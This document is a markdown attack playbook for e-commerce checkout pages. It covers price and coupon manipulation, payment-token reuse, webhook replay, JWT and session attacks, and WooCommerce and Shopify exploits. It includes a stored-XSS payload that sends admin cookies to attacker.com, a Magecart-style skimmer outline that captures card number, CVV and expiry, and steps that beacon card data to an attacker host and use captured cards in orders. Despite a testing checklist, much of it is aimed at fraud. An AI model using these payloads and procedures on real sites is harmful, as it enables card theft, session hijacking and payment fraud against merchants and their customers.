# Checkout Injection Attack Procedures

## Overview

Web checkout pages are the highest-traffic attack surface. Injection attacks target the payment form, token handling, and transaction flow to extract card data or manipulate prices.

## Common Checkout Platforms

```
Platform              | Injection Surface         | Common Vulns
---------------------|---------------------------|-------------------
WooCommerce           | WP plugin hooks, REST API  | auth bypass, SQLi
Shopify               | Liquid templates          | XSS, theme inject
Magento               | REST/V2 API               | admin takeover
WooCommerce Stripe    | PHP hooks, webhook        | webhook signature bypass
Custom (MVC/Express)  | Form handlers             | parameter injection
```

## Attack Vectors

### 1. Price Manipulation

```
A. Integer overflow in amount field
   - Send: amount=999999999999 (check for overflow)
   - Send: amount=-1 (negative price)
   - Send: amount=0.01 (minimum price exploit)
   - Target: server-side price validation missing

B. Currency swap attack
   - Set currency to weak currency (VND, IDR)
   - Set amount to equivalent of USD price in weak currency
   - Server converts: if conversion is client-side, price manipulated

C. Tip field injection
   - Many checkouts have tip field (restaurant POS integration)
   - Inject negative tip to offset purchase price
   - Example: item=$100, tip=-$100 → total=$0

D. Coupon code injection
   - Manipulate coupon validation logic
   - Coupon carryover between sessions
   - Time-based coupon exploit (timezone manipulation)
```

### 2. Token Manipulation

```
A. Token reuse across merchants
   - Capture Stripe/Braintree token from one checkout
   - Submit token to different merchant using same gateway
   - Test: does gateway validate token belongs to this merchant?

B. Token ID manipulation
   - Enumerate token IDs (tok_1234, tok_1235...)
   - Test if tokens work across accounts
   - Check for predictable token generation

C. Token → PAN extraction
   - Some gateways return masked PAN in token metadata
   - Query token metadata API with captured token
   - Extract: card last 4, expiry, card type
```

### 3. Card Field Injection (XSS → Data Exfil)

```
A. Stored XSS in cardholder name
   Field: cardholder_name
   Payload: <img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">

   Trigger: when merchant admin views orders
   Exfil: admin session cookie → attacker server

B. Card data skimmer (Magecart style)
   - Inject JavaScript into checkout page
   - JS captures: card number, expiry, CVV on submit
   - Sends to attacker-controlled endpoint
   - Original form submits normally (invisible attack)

   JS injection methods:
   - SQLi in product reviews (stored XSS)
   - Theme/plugin file modification
   - Supply chain attack (legitimate JS library compromised)
   - CDN compromise

C. Form field manipulation
   - Add hidden fields to checkout form
   - Inject malicious data into existing fields
   - Target: server stores manipulated data
```

### 4. Webhook Exploitation

```
A. Webhook replay
   - Capture legitimate webhook from test transaction
   - Replay with modified amount to steal via refund
   - Test: does gateway verify idempotency?

B. Signature bypass
   - Stripe webhook signature validation bypass
   - Send raw request without Stripe signature header
   - Test: does server accept unsigned webhooks?

C. Webhook endpoint enumeration
   - Burte-force common paths: /webhook, /ipn, /callback, /notify
   - Test for webhook endpoints that bypass auth
```

### 5. Authentication Bypass

```
A. JWT manipulation on checkout
   - Capture checkout JWT/session token
   - Manipulate: user_id, merchant_id, role
   - Test: does checkout validate JWT server-side?

B. Session fixation
   - Set checkout session ID before authentication
   - After login, session is still attacker-controlled
   - Access another user's checkout session

C. CSRF on checkout
   - Forge checkout submission from attacker's site
   - Target: checkout without CSRF tokens
```

## WooCommerce Specific Attacks

```
WooCommerce endpoints:
- POST /wc-api/v3/order (create order)
- POST /?wc-ajax=update_order_review
- POST /?wc-ajax=apply_coupon

Attacks:
1. SQLi in order ID parameter
   - GET /view-order/123' → error reveals SQL

2. Auth bypass via REST API
   - GET /wp-json/wc/v3/orders?consumer_key=xxx
   - Test: does API enforce auth properly?

3. Plugin hook injection
   - WooCommerce has 100+ PHP hooks
   - If custom plugin exposes hooks unsafely: RCE

4. File upload in product import
   - CSV import with PHP payload
   - If server processes CSV as PHP: RCE
```

## Shopify Specific Attacks

```
Shopify endpoints:
- POST /cart.js (add to cart)
- POST /checkout (process checkout)
- POST /account/login

Attacks:
1. Liquid template injection
   - {{ config.password | remove: "x" }}
   - If Shopify App renders user input in Liquid: XSS

2. Checkout ID enumeration
   - Shopify checkout IDs are sequential
   - Enumerate: /checkouts/1000, /checkouts/1001...
   - Access other users' incomplete checkouts

3. Discount code brute force
   - Common discount codes are short (6-8 chars)
   - Bruteforce: /discount/{code}?redirect=/checkout
```

## Testing Checklist

```
[ ] Price manipulation (negative, overflow, currency swap, tip)
[ ] Coupon injection (manipulation, replay, timezone)
[ ] Token reuse across merchants tested
[ ] Token ID enumeration tested
[ ] Token metadata extraction attempted
[ ] XSS in cardholder name tested
[ ] XSS in address fields tested
[ ] Magecart JS injection prepared
[ ] Webhook replay tested
[ ] Webhook signature bypass tested
[ ] Webhook endpoint enumeration complete
[ ] JWT manipulation tested (user_id, merchant_id)
[ ] Session fixation tested
[ ] CSRF on checkout tested
[ ] WooCommerce REST API auth tested
[ ] Shopify Liquid injection tested
[ ] Shopify checkout ID enumeration tested
[ ] Default/weak coupon codes brute-forced
```

## Data Exfiltration

```
Card data exfil via checkout:
1. Inject skimmer JS into page
2. On form submit: capture card fields
3. Encode: card|cvv|exp|year@attacker.com
4. Send via beacon: img src="https://attacker.com/e?"+data

Alternative: use checkout's own API
1. Create order with manipulated price
2. Use captured card in order
3. If partial auth: server calls webhook with full card
```

## Evidence Preservation

- Full HAR of checkout flow (network tab)
- Screenshot of successful injection
- PCAP of webhook traffic
- Hash of any injected scripts